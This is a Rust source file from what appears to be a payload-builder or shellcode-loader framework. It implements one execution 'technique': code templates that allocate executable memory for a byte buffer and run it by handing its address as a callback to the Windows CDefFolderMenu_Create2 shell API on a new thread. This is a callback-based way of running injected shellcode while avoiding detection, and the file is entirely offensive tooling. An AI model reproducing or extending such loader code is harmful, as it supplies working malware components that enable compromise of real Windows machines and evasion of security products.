use crate::techniques::{BuildContext, Technique, TechniqueMeta};

pub struct CdefFolderMenu;

impl Technique for CdefFolderMenu {
    fn meta(&self) -> &'static TechniqueMeta { &CDEF_FOLDER_MENU_META }

    fn apply(&self, ctx: &mut BuildContext) -> anyhow::Result<()> {
        ctx.set_template("callbackExec");

        let helpers = r#"
unsafe extern "system" fn cdef_invoke(param: *mut core::ffi::c_void) -> u32 {
    unsafe {
        // CoInitializeEx is process-global per-thread. Capture the HRESULT
        // so we only pair with CoUninitialize when *we* did the initialization.
        // RPC_E_CHANGED_MODE means the host already initialized the apartment
        // in a different model. We proceed without uninitializing it.
        let hr: i32 = windows_sys::Win32::System::Com::CoInitializeEx(
            std::ptr::null(),
            windows_sys::Win32::System::Com::COINIT_APARTMENTTHREADED as u32,
        );
        const S_OK: i32 = 0;
        const S_FALSE: i32 = 1;
        const RPC_E_CHANGED_MODE: i32 = 0x80010106u32 as i32;
        let we_initialized = hr == S_OK || hr == S_FALSE;
        if !we_initialized && hr != RPC_E_CHANGED_MODE {
            return 0;
        }

        let callback: windows_sys::Win32::UI::Shell::LPFNDFMCALLBACK =
            Some(std::mem::transmute(param));
        let mut ppcm: *mut std::ffi::c_void = std::ptr::null_mut();
        windows_sys::Win32::UI::Shell::CDefFolderMenu_Create2(
            std::ptr::null(),
            std::ptr::null_mut(),
            0,
            std::ptr::null(),
            std::ptr::null_mut(),
            callback,
            0,
            std::ptr::null(),
            &mut ppcm,
        );

        if we_initialized {
            windows_sys::Win32::System::Com::CoUninitialize();
        }
    }
    0
}
"#;
        ctx.set_replacement("{{INJECTION_HELPERS}}", helpers.to_string());

        let body = r#"
        let addr = syscall_alloc_exec(&vec);
        if addr.is_null() { return; }
        let thread = windows_sys::Win32::System::Threading::CreateThread(
            std::ptr::null(),
            0,
            Some(cdef_invoke),
            addr,
            0,
            std::ptr::null_mut(),
        );
        if !thread.is_null() {
            windows_sys::Win32::System::Threading::WaitForSingleObject(thread, 0xFFFFFFFF);
            windows_sys::Win32::Foundation::CloseHandle(thread);
        }
"#;
        ctx.set_replacement("{{CALLBACK_INVOKE}}", body.to_string());
        Ok(())
    }
}

pub use super::super::CDEF_FOLDER_MENU_META;
